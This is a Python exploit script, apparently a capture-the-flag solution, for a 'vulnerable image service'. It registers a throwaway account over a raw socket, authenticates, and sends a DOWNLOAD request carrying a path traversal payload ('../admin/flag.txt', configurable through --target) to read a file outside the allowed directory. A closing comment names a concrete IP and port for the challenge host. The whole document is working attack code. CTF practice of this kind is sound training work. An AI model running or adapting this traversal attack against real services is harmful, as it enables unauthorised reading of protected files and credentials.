#!/usr/bin/env python3
"""Exploit script for the vulnerable image service."""
from __future__ import annotations

import argparse
import secrets
import socket

MARKER = b"\nOK\n"

def recv_line(sock: socket.socket) -> bytes:
    data = bytearray()
    while True:
        ch = sock.recv(1)
        if not ch:
            raise ConnectionError("unexpected EOF while reading a line")
        data += ch
        if ch == b"\n":
            return bytes(data)

def send_line(sock: socket.socket, line: str) -> None:
    if "\n" in line:
        raise ValueError("line must not contain newlines")
    sock.sendall(line.encode() + b"\n")

def register(sock: socket.socket, user: str) -> str:
    send_line(sock, f"REGISTER {user}")
    while True:
        resp = recv_line(sock).strip()
        if not resp:
            continue
        if resp.startswith(b"ERR") and b"already" in resp:
            raise RuntimeError(resp.decode())
        if resp.startswith(b"ERR"):
            continue
        if len(resp) == 40:
            return resp.decode()

def authenticate(sock: socket.socket, user: str, token: str) -> None:
    send_line(sock, f"AUTH {user} {token}")
    while True:
        resp = recv_line(sock).strip()
        if resp == b"OK":
            return
        if resp.startswith(b"ERR"):
            raise RuntimeError(resp.decode())

def download(sock: socket.socket, target: str) -> bytes:
    send_line(sock, f"DOWNLOAD {target}")
    peek = sock.recv(4, socket.MSG_PEEK)
    if peek.startswith(b"ERR"):
        err = recv_line(sock)
        raise RuntimeError(err.decode().strip())
    buf = bytearray()
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("connection closed before terminator")
        buf += chunk
        marker_idx = buf.find(MARKER)
        if marker_idx != -1:
            return bytes(buf[:marker_idx])

def exploit(host: str, port: int, target: str) -> bytes:
    user = f"user_{secrets.token_hex(4)}"
    with socket.create_connection((host, port)) as sock:
        token = register(sock, user)
        authenticate(sock, user, token)
        return download(sock, target)

def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit the vulnerable image manager")
    parser.add_argument("host", nargs="?", help="challenge host/IP")
    parser.add_argument("port", nargs="?", type=int, help="challenge port")
    parser.add_argument("--host", dest="host_override", help="challenge host/IP (optional flag)")
    parser.add_argument("--port", dest="port_override", type=int, help="challenge port (optional flag)")
    parser.add_argument(
        "--target",
        default="../admin/flag.txt",
        help="path traversal used with DOWNLOAD (default: %(default)s)",
    )
    args = parser.parse_args()
    host = args.host_override or args.host
    port = args.port_override or args.port
    if host is None or port is None:
        parser.error("host and port must be provided either positionally or via --host/--port")
    data = exploit(host, port, args.target)
    try:
        print(data.decode())
    except UnicodeDecodeError:
        print(data)

if __name__ == "__main__":
    main()

# nc 35.197.152.52 1337